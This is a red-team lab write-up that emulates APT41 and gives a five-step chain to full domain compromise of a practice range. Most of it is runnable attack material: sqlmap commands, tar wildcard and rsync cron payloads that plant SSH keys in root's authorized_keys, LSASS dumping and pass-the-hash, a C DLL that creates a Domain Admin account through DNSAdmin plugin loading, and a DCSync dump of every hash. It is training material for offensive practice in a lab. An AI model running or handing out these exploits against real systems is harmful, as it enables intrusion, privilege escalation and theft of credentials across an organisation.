# APT41 — Operation PIPELINE BREACH
## Red Team Exercise Write-Up — Range 3

> **Classification:** RESTRICTED — Internal Red Team Use Only

| Field | Detail |
|---|---|
| **Environment** | 3 × Ubuntu 22.04 &nbsp;\|&nbsp; 2 × Windows Server 2019 |
| **Domain** | cyberange.local / CYBERANGE |
| **Actor** | APT41 (Double Dragon / BARIUM / WICKED PANDA) |
| **Attack Chain** | SQLi → Tar Wildcard → Rsync → LSASS → DNSAdmin DLL → DCSync |
| **End Goal** | Full Domain Compromise — DCSync of cyberange.local |

---

## 1. Executive Summary

The full attack chain runs across five hosts: a vulnerable Flask web application, a Linux build server, a Linux configuration server, a Windows management host, and a Windows Domain Controller. Starting from a single SQL injection, the chain terminates with a DCSync operation that extracts every credential hash in the **cyberange.local** domain.

### Attack Chain at a Glance

| Step | Source | Target | Technique | ATT&CK |
|---|---|---|---|---|
| 1 | Attacker (no creds) | LNXW | Blind SQLi — Flask /search endpoint | T1190 |
| 2 | deploy_user via SSH | LNXBUILDER | Tar wildcard injection via root cron job | T1548.001 |
| 3 | proxy-admin via SSH | LNXPROC | writable rsync → root | T1222 |
| 4 | ansible_svc (SMB) | MGMT | LSASS dump — extract svc_itops NT hash | T1003.001 |
| 5 | svc_itops (DA hash) | DC | DNSAdmin DLL injection → DCSync | T1484.001 / T1003.006 |

---

## 2. Lab Environment

### 2.1 Host Inventory

| Hostname | OS | Role | Key Vulnerability |
|---|---|---|---|
| DC.cyberange.local | Windows Server 2019 | Domain Controller + DNS | DNSAdmin group abuse |
| MGMT.cyberange.local | Windows Server 2019 | Management Server | DLL hijack — CorpMonitor service |
| LNXW.cyberange.local | Ubuntu 22.04 | Web / Inventory App | Blind SQL injection (Flask) |
| LNXBUILDER.cyberange.local | Ubuntu 22.04 | Build Server | Tar wildcard via root cron |
| LNXPROC.cyberange.local | Ubuntu 22.04 | Config / Process Server | writable rsync |

### 2.2 Domain Accounts

| Account | Type | Group Membership | Purpose |
|---|---|---|---|
| svc_itops | Service account | Domain Admins, DnsAdmins | IT operations — FINAL TARGET |
| deploy_user | Service account | Domain Users | Automated SSH deployments |
| ansible_svc | Service account | Local Admin on MGMT | Ansible Windows automation |
| jparker, slee, mchen … (×10) | User accounts | Domain Users | Regular staff |

### 2.3 Boot Order

Boot **DC (.10)** first and wait 90 seconds for AD DS to initialise before starting anything else. **MGMT** must come next, as it requires the DC to be reachable for its domain join. **LNXW, LNXBUILDER, and LNXPROC** can then be started in any order — their bootstrap scripts auto-discover the DC at `x.x.x.10` and configure DNS automatically.

The lab is fully operational approximately 3–5 minutes after all five VMs are running.

---

## 3. Environment Setup

Before running any attack step, execute the setup function from the attack script. This must be done from a **Kali Linux** attacker machine that has network access to the lab subnet.

### 3.1 Required Tools

| Tool | Purpose |
|---|---|
| nmap | Network discovery and port scanning |
| sqlmap | SQL injection automation |
| sshpass | Non-interactive SSH with password authentication |
| rsync | rsync client for Step 3 |
| impacket (secretsdump, wmiexec, smbclient) | Windows credential extraction and remote execution |
| netexec (nxc) | SMB/WMI enumeration, lsassy module for LSASS dumping |
| x86_64-w64-mingw32-gcc (mingw-w64) | Cross-compile the Windows DLL payload for Step 5 |

### 3.2 Running Setup

Make the attack script executable and run it as root, then select option `[0]` from the interactive menu to trigger the setup function.

```bash
chmod +x scripts/attack_chain_s3.sh
sudo ./scripts/attack_chain_s3.sh
# From the menu, select [0] — Setup Environment
```

The setup function performs the following steps automatically:

**Host discovery** — Resolves all five lab hosts via DNS (DC queried at `x.x.x.10`). Falls back to port-based fingerprinting if DNS resolution fails for any host.

**`/etc/hosts` population** — Writes all five hostnames and IPs into the local hosts file so name resolution works without depending on external DNS.

**Kerberos config** — Writes `/etc/krb5.conf` for the `CYBERANGE.LOCAL` realm, enabling Kerberos-based tool operations later in the chain.

**SSH keypair** — Generates an Ed25519 keypair at `/opt/redteam/loot/keys/attacker_key`. The public key is injected into root's `authorized_keys` on LNXBUILDER and LNXPROC during Steps 2 and 3.

**DLL compilation** — Cross-compiles `health_check.dll` for Step 5 using mingw. The DLL executes `net user hacker P@ssw0rd123! /add /domain` when loaded by the DNS service.

**Tool verification** — Checks all required tools are present on the attacker machine and reports any that are missing before the chain begins.

**State persistence** — The script saves all extracted credentials to `/opt/redteam/loot/.state_s3` after each step completes. If a step is interrupted, re-running it will reload the last known credential state. Use option `[S]` from the menu to view the current state at any time.

---

## Step 1 — Blind SQL Injection on LNXW

**Target:** `LNXW.cyberange.local ` &nbsp;|&nbsp; **MITRE:** T1190 — Exploit Public-Facing Application

### What This Step Does

The Psychorp Inventory Management System is a Flask web application running on LNXW. It manages IT asset records and stores SSH credentials for automated deployments in a MySQL database. The application was built without input sanitisation — user-supplied values are concatenated directly into SQL query strings.

This step exploits that vulnerability to extract the contents of the `deploy_credentials` table, which contains plaintext SSH usernames and passwords for LNXBUILDER, LNXW, and LNXPROC. No authentication is required to begin the attack.

### Why It Works

The vulnerable search endpoint in `app.py` builds its SQL query by directly interpolating user input with no escaping. A single quote breaks out of the string context, and injecting `SLEEP(5)` causes MySQL to wait five seconds — confirming that the injection is being evaluated server-side. Because the `deploy_credentials` table is in the same database (`inventory_app`) as the inventory records, and the app's MySQL user has SELECT rights across the whole database, a UNION-based injection can pull the entire credentials table in a single request.

```python
# VULNERABLE — app.py /search route
# User-supplied "query" is interpolated directly with no sanitisation.
sql = f"SELECT * FROM inventory WHERE item_name LIKE '%{query}%' OR category LIKE '%{query}%'"
```

### Phase 1a — Network Discovery

Begin by scanning the subnet from the attacker machine to locate all live lab hosts, then fingerprint the web application running on LNXW.

```bash
# Broad discovery scan — identify live hosts across the lab subnet
nmap -sT -T4 --top-ports 1000 -oN /opt/redteam/loot/nmap_subnet.txt <SUBNET>.0/24

# Targeted service scan of LNXW across relevant ports
nmap -sT -sV -p 22,80,443,3306,5000 LNXW.cyberange.local

# Fingerprint the web application and confirm it is reachable
curl -v http://LNXW.cyberange.local/
```

**Expected result:** Ports 22 (SSH) and 80 (Nginx) are open. The HTTP response identifies the application as **Psychorp Inventory Management System v3.2.1**.

### Phase 1b — Confirm SQL Injection

Manually verify the injection point before running sqlmap. This ensures the endpoint is vulnerable and avoids wasted automated scan time.

```bash
# Inject SLEEP(5) — a 5-second HTTP response delay confirms the input reaches MySQL
curl -s -o /dev/null -w 'Time: %{time_total}s\n' \
  'http://LNXW.cyberange.local/search?q=test%27+AND+SLEEP(5)--+-'

# Negative control — no delay expected with SLEEP(0)
curl -s -o /dev/null -w 'Time: %{time_total}s\n' \
  'http://LNXW.cyberange.local/search?q=test%27+AND+SLEEP(0)--+-'
```

A roughly five-second delay on the first request and a normal response time on the second confirms the injection is being evaluated by MySQL.

### Phase 1c — Automated Extraction with sqlmap

sqlmap automates time-based blind extraction. The `--technique=T` flag restricts it to time-based blind injection only. Run the first command to confirm the injectable parameter and identify the database, then run the second to dump the specific credentials table.

```bash
# Step 1: Identify injectable parameters and confirm the database engine
sqlmap -u 'http://LNXW.cyberange.local/search?q=test' \
  --batch --level=3 --risk=2 \
  --technique=T --dbms=MySQL --threads=3 \
  --output-dir=/opt/redteam/loot/sqlmap

# Step 2: Dump the deploy_credentials table directly
sqlmap -u 'http://LNXW.cyberange.local/search?q=test' \
  --batch --level=3 --risk=2 \
  --technique=T --dbms=MySQL \
  -D inventory_app -T deploy_credentials --dump \
  --threads=10 \
  --output-dir=/opt/redteam/loot/sqlmap
```

**Expected output — `deploy_credentials` table:**

| hostname | username | password | purpose |
|---|---|---|---|
| LNXBUILDER.cyberange.local | deploy_user | D3pl0y#2025! | Automated build deployment |


### Phase 1e — Validate SSH Access

Confirm the extracted credential works before proceeding to Step 2.

```bash
# Test SSH access to LNXBUILDER using the recovered deploy_user password
sshpass -p 'D3pl0y#2025!' ssh -o StrictHostKeyChecking=no \
  deploy_user@LNXBUILDER.cyberange.local \
  'whoami && hostname && id'

# Expected output:
# deploy_user
# LNXBUILDER
# uid=1001(deploy_user) gid=1001(deploy_user) groups=1001(deploy_user),1002(builders)
```

> **Step 1 Result:** `deploy_user:D3pl0y#2025!` — SSH access to LNXBUILDER confirmed.

---

## Step 2 — Tar Wildcard Injection on LNXBUILDER

**Target:** `LNXBUILDER.cyberange.local ` &nbsp;|&nbsp; **MITRE:** T1548.001 — Setuid / Cron Privilege Escalation

### What This Step Does

LNXBUILDER runs a root-owned cron job every two minutes that backs up build artifacts using `tar` with a wildcard (`*`) in a directory writable by `deploy_user`. By placing files with names that `tar` interprets as command-line flags, the attacker causes the cron job to execute arbitrary code as root.

After achieving root, the attacker reads the Ansible vault password file stored in plaintext on the same machine and decrypts the vault, which contains SSH credentials for `proxy-admin` on LNXPROC and the Windows credentials for `ansible_svc`.

### Why It Works

The backup script runs as root via cron and expands the `*` wildcard against `/opt/builds/`. When filenames beginning with `--` exist in that directory, `tar` processes them as command-line options rather than file arguments. The `--checkpoint-action=exec=sh shell.sh` option instructs `tar` to execute `shell.sh` at every checkpoint interval. Because the cron runs as root, the script executes with root privileges. The key condition is that `deploy_user` is a member of the `builders` group, which has write access to `/opt/builds/` — a realistic permission for a build account.

```bash
# /opt/backup-builds.sh (runs as root via cron every 2 minutes)
# The wildcard causes tar to expand filenames as arguments, including flag-like names
cd /opt/builds && tar czf /var/backups/builds-$(date +%Y%m%d).tar.gz *
```

### Phase 2a — Enumerate LNXBUILDER

SSH in as `deploy_user` and gather the information needed to understand the cron configuration and confirm write access to the target directory.

```bash
# Authenticate to LNXBUILDER as deploy_user
sshpass -p 'D3pl0y#2025!' ssh deploy_user@LNXBUILDER.cyberange.local

# Read the cron job definition to confirm it runs every 2 minutes as root
cat /etc/cron.d/build-backup
# */2 * * * * root /opt/backup-builds.sh

# Read the backup script to confirm the wildcard expansion pattern
cat /opt/backup-builds.sh
# cd /opt/builds && tar czf /var/backups/builds-$(date +%Y%m%d).tar.gz *

# Confirm deploy_user has write access to /opt/builds
ls -la /opt/builds
```

### Phase 2b — Stage the Wildcard Payload

Create the malicious shell script and the two flag-named files that `tar` will interpret as options. All three files must exist in `/opt/builds/` before the cron job fires.

```bash
# Write the reverse shell / SSH key injection payload
# This runs as root when tar processes the checkpoint action
cat > /opt/builds/shell.sh << 'EOF'
#!/bin/bash
mkdir -p /root/.ssh
echo "$(cat /opt/redteam/loot/keys/attacker_key.pub)" >> /root/.ssh/authorized_keys
chmod 700 /root/.ssh
chmod 600 /root/.ssh/authorized_keys
EOF
chmod +x /opt/builds/shell.sh

# Create the two flag files — tar treats these as command-line options
# --checkpoint=1 makes tar evaluate the action at every file processed
# --checkpoint-action=exec=sh shell.sh tells tar what to run at each checkpoint
touch /opt/builds/--checkpoint=1
touch '/opt/builds/--checkpoint-action=exec=sh shell.sh'
```

### Phase 2c — Wait for the Cron Job to Fire

The root cron job runs every two minutes. Wait for it to execute, then test the SSH key injection by connecting directly as root.

```bash
# Wait for the cron cycle to complete (up to 120 seconds)
sleep 125

# Test root SSH access using the injected attacker key
ssh -i /opt/redteam/loot/keys/attacker_key \
    -o StrictHostKeyChecking=no \
    root@LNXBUILDER.cyberange.local 'whoami && hostname'
# root
# LNXBUILDER
```

### Phase 2d — Decrypt the Ansible Vault

With root access confirmed, read the Ansible vault password and use it to decrypt the vault file containing credentials for the next two targets.

```bash
# Read the plaintext vault password file
ssh -i /opt/redteam/loot/keys/attacker_key root@LNXBUILDER.cyberange.local \
    'cat /opt/ansible/.vault_pass'

# Decrypt the vault using the recovered password — reveals proxy-admin and ansible_svc credentials
ssh -i /opt/redteam/loot/keys/attacker_key root@LNXBUILDER.cyberange.local \
    'ansible-vault view /opt/ansible/group_vars/all_creds.yml \
     --vault-password-file /opt/ansible/.vault_pass'

# Vault reveals: proxy-admin:Pr0xy@dm1n2025 and ansible_svc:Ans1bl3#Mgmt2025!
```

> **Step 2 Result:** Root on LNXBUILDER. Ansible vault decrypted — `proxy-admin:Pr0xy@dm1n2025` recovered.

---

## Step 3 — Rsync Write on LNXPROC

**Target:** `LNXPROC.cyberange.local ` &nbsp;|&nbsp; **MITRE:** T1222 — File and Directory Permissions Modification

### What This Step Does

LNXPROC exposes an rsync daemon with a module called `server-configs` that maps directly to `/etc` and is configured as writable without authentication. By writing a malicious cron file into `/etc/cron.d/`, the attacker injects a root cron job that appends the attacker's SSH public key into `/root/.ssh/authorized_keys`. Once the cron fires, the attacker has direct root SSH access to LNXPROC.

After achieving root, the attacker extracts the Kerberos keytab (`/etc/krb5.keytab`) and decrypts a second Ansible vault on this machine to confirm the `ansible_svc` Windows credentials.

### Why It Works

The rsync daemon's configuration for the `server-configs` module sets `read only = false` and specifies no authentication — meaning any host with network access to port 873 can write files anywhere under the module's path. Since the module maps to `/etc`, writing to `cron.d/` is equivalent to creating a new privileged cron job on the system. The cron daemon picks up any new files in that directory automatically.

### Phase 3a — SSH into LNXPROC as proxy-admin

First, SSH into LNXPROC using the `proxy-admin` credentials obtained from Step 2 (decrypted Ansible vault).

```bash
# SSH to LNXPROC as proxy-admin
ssh 'proxy-admin@LNXPROC.cyberange.local'
```

Probe the rsync daemon to list available modules and confirm the `server-configs` module is accessible without credentials.

```bash
# List all available rsync modules on LNXPROC
rsync rsync://LNXPROC.cyberange.local/
# server-configs    Server configuration files

# List the contents of the module — confirms it maps to /etc on LNXPROC
rsync rsync://LNXPROC.cyberange.local/server-configs/
# Full directory listing of /etc/ is returned
```

### Phase 3b — Write a Malicious Crontab via Rsync

Build a crontab payload that injects the attacker's public SSH key into root's `authorized_keys` every minute, then upload it directly to `/etc/cron.d/` using the writable module.

```bash
# Read the attacker's SSH public key into a variable
ATTACKER_KEY=$(cat /opt/redteam/loot/keys/attacker_key.pub)

# Build the crontab payload — fires every minute, runs as root
cat > /tmp/attacker_cron << EOF
* * * * * root mkdir -p /root/.ssh && echo '$ATTACKER_KEY' >> /root/.ssh/authorized_keys && chmod 700 /root/.ssh && chmod 600 /root/.ssh/authorized_keys
EOF

# Upload the file to /etc/cron.d/ via the writable rsync module
rsync /tmp/attacker_cron rsync://LNXPROC.cyberange.local/server-configs/cron.d/attacker

# Clean up the local temp file
rm -f /tmp/attacker_cron
```

The file is written to `/etc/cron.d/attacker` on LNXPROC. The cron daemon reads this directory automatically — no further interaction is needed.

### Phase 3c — Wait for Root SSH Access

Wait one minute for the cron job to fire, then test the SSH connection to confirm root access has been granted.

```bash
# Wait 65 seconds for the cron job to fire and write the key
sleep 65

# Test root SSH using the injected attacker key
ssh -i /opt/redteam/loot/keys/attacker_key \
    -o StrictHostKeyChecking=no \
    root@LNXPROC.cyberange.local 'whoami && hostname'
# root
# LNXPROC
```

### Phase 3d — Extract the Kerberos Keytab

LNXPROC is domain-joined. When `realm join` ran during setup, it created a Kerberos keytab at `/etc/krb5.keytab` containing the machine account principal `LNXPROC$@CYBERANGE.LOCAL`. Extracting this keytab enables Kerberos authentication to Active Directory services without requiring a password.

```bash
# Download the keytab from LNXPROC to the attacker machine
scp -i /opt/redteam/loot/keys/attacker_key \
    root@LNXPROC.cyberange.local:/etc/krb5.keytab \
    /opt/redteam/loot/krb5.keytab

# Inspect the keytab to confirm the machine account principal is present
klist -k /opt/redteam/loot/krb5.keytab
# Keytab name: FILE:/opt/redteam/loot/krb5.keytab
# KVNO  Principal
#    3  LNXPROC$@CYBERANGE.LOCAL
```

### Phase 3e — Decrypt the Second Ansible Vault

LNXPROC holds a second copy of the Ansible vault containing the Windows credentials for `ansible_svc`. Read the vault password and decrypt the vault to confirm the credential before moving to Step 4.

```bash
# Read the vault password stored on LNXPROC
ssh -i /opt/redteam/loot/keys/attacker_key root@LNXPROC.cyberange.local \
    'cat /opt/ansible/.vault_pass'

# Decrypt the vault — confirms ansible_svc:Ans1bl3#Mgmt2025!
ssh -i /opt/redteam/loot/keys/attacker_key root@LNXPROC.cyberange.local \
    'ansible-vault view /opt/ansible/group_vars/windows_creds.yml \
     --vault-password-file /opt/ansible/.vault_pass'
# Confirms: ansible_svc:Ans1bl3#Mgmt2025!
```

> **Step 3 Result:** Root on LNXPROC. `krb5.keytab` extracted (LNXPROC$ machine account). `ansible_svc:Ans1bl3#Mgmt2025!` confirmed for Windows access.

---

## Step 4 — LSASS Dump on MGMT — Extract svc_itops Hash

**Target:** `MGMT.cyberange.local ` &nbsp;|&nbsp; **MITRE:** T1003.001 — OS Credential Dumping: LSASS Memory

### What This Step Does

Using the `ansible_svc` credentials obtained in Step 3, the attacker authenticates to the MGMT server as a local administrator. MGMT runs a persistent scheduled task (`ITOpsMonitor`) under the `CYBERANGE\svc_itops` account — a member of both Domain Admins and DnsAdmins — which keeps `svc_itops` credentials cached in LSASS memory.

LSASS is unprotected (RunAsPPL disabled) and WDigest credential caching is enabled, meaning both the NT hash and cleartext password are recoverable. The attacker dumps LSASS remotely using `nxc`'s lsassy module or Impacket's secretsdump as a fallback.

### Why It Works

Three misconfigurations on MGMT make this attack possible:

| Setting | Value | Impact |
|---|---|---|
| RunAsPPL | 0 (disabled) | LSASS process is not protected — any local admin can dump it |
| WDigest UseLogonCredential | 1 (enabled) | Cleartext credentials are cached alongside NT hashes in LSASS |
| LocalAccountTokenFilterPolicy | 1 | Remote admin operations via SMB are permitted without UAC elevation |

### Phase 4a — Verify Access to MGMT

Confirm that `ansible_svc` has local administrator rights on MGMT.

```bash
# Confirm ansible_svc has local admin rights — look for (Pwn3d!) in the output
nxc smb MGMT.cyberange.local \
    -u ansible_svc -p 'Ans1bl3#Mgmt2025!' \
    -d cyberange.local
# Expected: MGMT [+] cyberange.local\ansible_svc:Ans1bl3#Mgmt2025! (Pwn3d!)
```

### Phase 4b — Dump LSASS (Primary Method — lsassy)

The `lsassy` module remotely dumps LSASS using the `comsvcs.dll MiniDump` technique without dropping any additional tooling to disk on the target.

```bash
# Dump LSASS remotely and save the output for parsing
nxc smb MGMT.cyberange.local \
    -u ansible_svc -p 'Ans1bl3#Mgmt2025!' \
    -d cyberange.local \
    -M lsassy \
    2>&1 | tee /opt/redteam/loot/lsassy_mgmt.txt

# Extract the svc_itops entry from the dump output
grep -i 'svc_itops' /opt/redteam/loot/lsassy_mgmt.txt
# MGMT    445    MGMT    svc_itops    CYBERANGE    <NT_HASH>
```

### Phase 4c — Fallback Method — secretsdump

If lsassy fails due to a module dependency issue, use Impacket's secretsdump directly.

```bash
# Dump all credentials from MGMT using secretsdump
impacket-secretsdump cyberange.local/ansible_svc:'Ans1bl3#Mgmt2025!'@MGMT.cyberange.local \
    2>&1 | tee /opt/redteam/loot/secretsdump_mgmt.txt

# Extract the svc_itops NT hash from the output — it is the fourth colon-separated field
grep -i 'svc_itops' /opt/redteam/loot/secretsdump_mgmt.txt
# CYBERANGE\svc_itops:1103:aad3b435b51404eeaad3b435b51404ee:<NT_HASH>:::
```

### Phase 4d — Validate the Hash (Pass-the-Hash)

Test the recovered NT hash against the Domain Controller before proceeding. This confirms the hash is correct and that `svc_itops` retains Domain Admin access.

```bash
# Pass-the-Hash the svc_itops NT hash against the DC
nxc smb DC.cyberange.local \
    -u svc_itops -H '<NT_HASH>' \
    -d cyberange.local
# Expected: DC [+] cyberange.local\svc_itops:<NT_HASH> (Pwn3d!)
# (Pwn3d!) confirms Domain Admin access to the DC
```

> **Step 4 Result:** `svc_itops` NT hash recovered — Domain Admin + DnsAdmins member. Pass-the-Hash access to DC confirmed.

---

## Step 5 — DNSAdmin DLL Injection on DC → DCSync

**Target:** `DC.cyberange.local (.10)` &nbsp;|&nbsp; **MITRE:** T1484.001 — DNSAdmin Abuse / T1003.006 — DCSync

### What This Step Does

Members of the **DnsAdmins** group in Active Directory can configure the DNS server to load a plugin DLL using `dnscmd /config /serverlevelplugindll`. When the DNS service restarts, `dns.exe` — running as SYSTEM on the DC — calls `LoadLibrary()` on the specified DLL path.

The attacker uploads a malicious DLL (`health_check.dll`) compiled during setup, configures DNS to load it, then restarts the service. The DLL's `DllMain()` function executes with SYSTEM privileges and creates a new Domain Admin account (`hacker`). With a Domain Admin account, the attacker performs a DCSync operation to extract every credential hash in the domain.

### Why It Works

`svc_itops` is a member of both **Domain Admins** and **DnsAdmins**. The DnsAdmins group membership grants the right to call `dnscmd /config /serverlevelplugindll`, which writes the plugin path to the registry at `HKLM\SYSTEM\CurrentControlSet\Services\DNS\Parameters\ServerLevelPluginDll`. When the DNS service restarts, `dns.exe` loads the DLL from whatever path is specified — including a UNC path on an attacker-controlled share.

### The DLL Payload

The payload DLL was cross-compiled by the setup function using `x86_64-w64-mingw32-gcc`. Its `DllMain` creates a new Domain Admin account when loaded by the DNS service running as SYSTEM.

```c
#include <windows.h>
#include <stdlib.h>

BOOL APIENTRY DllMain(HMODULE hModule, DWORD reason, LPVOID lpReserved) {
    if (reason == DLL_PROCESS_ATTACH) {
        // Create a new Domain Admin account when dns.exe loads this DLL
        system("cmd.exe /c net user hacker P@ssw0rd123! /add /domain "
               "&& net group \"Domain Admins\" hacker /add /domain");
    }
    return TRUE;
}
```

### Phase 5a — Verify svc_itops Access to DC

Confirm the `svc_itops` NT hash authenticates successfully against the DC and enumerate available shares to locate the `DCHealthAgent` upload target.

```bash
# Confirm the svc_itops hash is valid against the DC
nxc smb DC.cyberange.local \
    -u svc_itops -H '$SVC_ITOPS_HASH' \
    -d cyberange.local

# Enumerate DC shares — confirm DCHealthAgent is present and accessible
nxc smb DC.cyberange.local \
    -u svc_itops -H '$SVC_ITOPS_HASH' \
    -d cyberange.local --shares
```

### Phase 5b — Upload the Malicious DLL

Upload `health_check.dll` to the `DCHealthAgent` share on the DC, then verify the file is present before proceeding.

```bash
# Upload the DLL to the DCHealthAgent share via SMB
echo -e 'use DCHealthAgent\nput /opt/redteam/tools/health_check.dll\nexit' | \
    impacket-smbclient cyberange.local/svc_itops@DC.cyberange.local \
    -hashes :$SVC_ITOPS_HASH

# Verify the upload succeeded — health_check.dll should appear in the directory listing
echo -e 'use DCHealthAgent\nls\nexit' | \
    impacket-smbclient cyberange.local/svc_itops@DC.cyberange.local \
    -hashes :$SVC_ITOPS_HASH
```

### Phase 5c — Configure the DNS Plugin

Use `dnscmd` via a WMI shell to set the plugin DLL path in the DNS server registry, pointing it at the DLL just uploaded to the DC share.

```bash
# Write the plugin DLL path into the DNS server configuration via WMI
# This sets HKLM\SYSTEM\CurrentControlSet\Services\DNS\Parameters\ServerLevelPluginDll
impacket-wmiexec cyberange.local/svc_itops@DC.cyberange.local \
    -hashes :$SVC_ITOPS_HASH \
    "dnscmd DC.cyberange.local /config /serverlevelplugindll \\\\DC.cyberange.local\\DCHealthAgent\\health_check.dll"
```

### Phase 5d — Restart the DNS Service

Stopping and starting the DNS service causes `dns.exe` to reload and call `LoadLibrary()` on the configured plugin path, executing the DLL payload as SYSTEM.

```bash
# Restart the DNS service — triggers LoadLibrary() on the plugin DLL
# DllMain executes as SYSTEM:
#   net user hacker P@ssw0rd123! /add /domain
#   net group "Domain Admins" hacker /add /domain
impacket-wmiexec cyberange.local/svc_itops@DC.cyberange.local \
    -hashes :$SVC_ITOPS_HASH \
    'sc stop dns && sc start dns'
```

### Phase 5e — Verify the New Domain Admin Account

Poll the DC to confirm the `hacker` account has been created and granted Domain Admin membership. The DNS service may take up to 60 seconds to cycle.

```bash
# Test authentication with the newly created hacker account
nxc smb DC.cyberange.local \
    -u hacker -p 'P@ssw0rd123!' \
    -d cyberange.local
# Expected: DC [+] cyberange.local\hacker:P@ssw0rd123! (Pwn3d!)
# (Pwn3d!) confirms Domain Admin access
```

### Phase 5f — DCSync — Full Domain Credential Dump

With a Domain Admin account confirmed, `impacket-secretsdump` performs a DCSync operation — impersonating a Domain Controller to replicate all credential hashes from the AD database without touching disk on the DC.

```bash
# Perform DCSync and save all extracted hashes to disk
impacket-secretsdump cyberange.local/hacker:'P@ssw0rd123!'@DC.cyberange.local \
    2>&1 | tee /opt/redteam/loot/dcsync_hashes.txt

# Count the total number of extracted credential entries
grep -c ':::' /opt/redteam/loot/dcsync_hashes.txt

# Extract the highest-value hashes — krbtgt enables Golden Tickets, Administrator gives persistent DA
grep -E '(Administrator|krbtgt|svc_itops)' /opt/redteam/loot/dcsync_hashes.txt
```

> **Step 5 Result: FULL DOMAIN COMPROMISE.** DCSync completed. All domain credential hashes extracted, including `krbtgt` (Golden Ticket) and `Administrator`. cyberange.local is fully owned.

---

## 4. Credential Chain Summary

| Credential | Source Host | Extracted From | Enables Access To |
|---|---|---|---|
| deploy_user:D3pl0y#2025! | LNXW | MySQL deploy_credentials (SQLi) | SSH → LNXBUILDER |
| proxy-admin:Pr0xy@dm1n2025 | LNXBUILDER | Ansible vault (post-root) | SSH → LNXPROC |
| ansible_svc:Ans1bl3#Mgmt2025! | LNXBUILDER | Ansible vault (post-root) | SMB/WinRM admin → MGMT |
| svc_itops NT hash | MGMT | LSASS memory dump | Domain Admin PtH → DC |
| LNXPROC$ keytab | LNXPROC | /etc/krb5.keytab (post-root) | Kerberos auth to AD |
| hacker:P@ssw0rd123! | DC | DLL injection (SYSTEM on DC) | DCSync → all hashes |
| All domain hashes (inc. krbtgt) | DC | DCSync | Full domain — persistent |

---

## 5. Running the Full Chain

### 5.1 Menu Options

| Option | Action |
|---|---|
| [0] | Setup — DNS, hosts, tools verification, DLL compilation, SSH keygen |
| [1] | Step 1 — Blind SQLi on LNXW → deploy_user credentials |
| [2] | Step 2 — Tar wildcard injection on LNXBUILDER → root → vault decrypt |
| [3] | Step 3 — Rsync write on LNXPROC → root → keytab → ansible_svc |
| [4] | Step 4 — LSASS dump on MGMT → svc_itops NT hash |
| [5] | Step 5 — DNSAdmin DLL injection on DC → hacker DA → DCSync |
| [A] | Run ALL steps sequentially (full automated chain) |
| [S] | Show current state — displays all collected credentials |
| [Q] | Quit — artifacts remain in /opt/redteam/loot/ |

### 5.2 Full Automated Run

To run the entire chain from start to finish without manual intervention, launch the script, complete setup, then select `[A]`. The script pauses five seconds between each step. If any step fails to auto-extract a credential, it will prompt for manual entry before continuing.

```bash
sudo ./scripts/attack_chain_s3.sh
# Select [0] — Setup
# Select [A] — Run ALL
```

### 5.3 Loot Directory Structure

```
/opt/redteam/loot/
├── .state_s3                  # saved credential state
├── attack_log.txt             # full timestamped log
├── nmap_subnet.txt            # network discovery results
├── nmap_LNXW.txt              # per-host port scans
├── sqlmap/                    # sqlmap output and dumps
│   └── inventory_app/deploy_credentials.csv
├── build_enum.txt             # LNXBUILDER enumeration
├── vault_decrypted.txt        # decrypted Ansible vault (LNXBUILDER)
├── proxy_vault_decrypted.txt  # decrypted Ansible vault (LNXPROC)
├── krb5.keytab                # machine account keytab from LNXPROC
├── lsassy_mgmt.txt            # LSASS dump output
├── secretsdump_mgmt.txt       # secretsdump output (fallback)
├── dcsync_hashes.txt          # full DCSync credential dump
└── keys/
    ├── attacker_key           # private SSH key
    └── attacker_key.pub       # public SSH key (injected into roots)
```

---

## 6. Troubleshooting

| Issue | Likely Cause | Fix |
|---|---|---|
| sqlmap finds no injection | Session cookie required for /search | Log in manually first to get a session, or test /login with the username field |
| sqlmap extraction very slow | Time-based blind is slow by design | Add `--technique=U` to allow UNION-based extraction (much faster) |
| Tar wildcard: root SSH never works after 3+ minutes | Cron may have failed silently | Check `/var/log/syslog` on LNXBUILDER. Try the SUID rootbash: `/tmp/rootbash -p -c 'whoami'` |
| Rsync: 'connection refused' on port 873 | Rsync daemon not running | SSH as proxy-admin and run: `sudo systemctl start rsync` |
| lsassy fails on MGMT | Module dependency issue | Use secretsdump fallback: `impacket-secretsdump domain/ansible_svc:'password'@MGMT` |
| dnscmd says 'access denied' | svc_itops not in DnsAdmins, or hash wrong | Run `[S]` to verify hash. Confirm DnsAdmins membership: `net group DnsAdmins /domain` |
| 'hacker' account not created after DNS restart | DLL not loaded or path wrong | Wait 60 seconds. Check DNS Event Log on DC for Event 770/150. Verify DLL path in registry. |
| DCSync returns no hashes | hacker account not yet in DA group | Wait 60 seconds for ITOpsMonitor to cycle, then retry DCSync |

---

## 7. MITRE ATT&CK Mapping

| Tactic | Technique ID | Technique Name | Step |
|---|---|---|---|
| Initial Access | T1190 | Exploit Public-Facing Application | 1 |
| Execution | T1059.004 | Unix Shell | 2, 3 |
| Execution | T1569.002 | Service Execution | 5 |
| Persistence | T1053.003 | Scheduled Task/Job: Cron | 2, 3 |
| Persistence | T1543.003 | Create or Modify System Process: Windows Service | 5 |
| Privilege Escalation | T1548.001 | Abuse Elevation Control: Setuid/Setgid | 2 |
| Privilege Escalation | T1484.001 | Domain Policy Modification (DNSAdmin) | 5 |
| Defense Evasion | T1036.004 | Masquerade Task or Service | 2, 3 |
| Credential Access | T1552.001 | Credentials in Files | 2, 3 |
| Credential Access | T1552.004 | Private Keys / Keytab | 3 |
| Credential Access | T1003.001 | OS Credential Dumping: LSASS Memory | 4 |
| Credential Access | T1003.006 | OS Credential Dumping: DCSync | 5 |
| Credential Access | T1558.002 | Steal Kerberos Tickets (keytab) | 3 |
| Lateral Movement | T1078.002 | Valid Accounts: Domain Accounts | 4, 5 |
| Lateral Movement | T1021.002 | SMB/Windows Admin Shares | 4, 5 |
| Impact | T1136.002 | Create Account: Domain Account | 5 |

---

> **END OF WRITE-UP**  
> APT41 — Operation PIPELINE BREACH — Range 3  
> **RESTRICTED — Internal Red Team Use Only**
